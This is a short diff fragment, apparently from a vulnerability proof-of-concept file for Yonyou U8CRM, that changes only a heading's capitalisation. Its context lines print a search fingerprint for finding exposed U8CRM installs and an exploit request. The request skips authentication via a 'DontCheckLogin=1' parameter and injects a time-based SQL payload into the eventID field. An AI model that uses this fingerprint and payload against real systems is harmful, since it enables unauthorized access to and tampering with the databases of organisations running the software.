@@ -8,7 +8,7 @@
 body="用友U8CRM" || body="/js/tfunction.js" || title="用友U8CRM"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
